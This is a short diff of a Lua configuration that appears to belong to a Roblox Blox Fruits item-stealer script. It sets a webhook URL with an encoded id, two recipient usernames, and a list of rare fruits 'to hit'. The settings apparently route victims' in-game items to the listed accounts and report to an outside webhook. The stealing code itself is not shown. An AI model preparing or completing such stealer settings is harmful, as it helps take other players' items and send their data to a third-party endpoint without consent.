@@ -1,4 +1,4 @@
-Webhook = "" -- << Your Webhook
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=cE9CZ2RvMzNhX2RVNmpxUnoxVmw3dzo5a3lIVnVhbVZGcE5ha0lSTlZyV0dWa3dHUTNYYVk2SlZMWnEzUUdkWllCeVJPRzJfcnd0M1NncDFPbTZtb2pRZEVSZGNYU1Z4V3U0Ykh0enRxdDFFaFE5aENDTjlsQ2RCZWJUN25lLUJvNVJuUEpqcjVEZ1YwX2M0TUQtRVZFSDNHaEM5Y2F1amRpZ29DQmFCQWV4a25Yd3V1eTR4RVlqWE9yQjhJdGZyb2c" -- << Your Webhook
 Usernames = {"Rip_draguop0", "Rip_illusion444"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
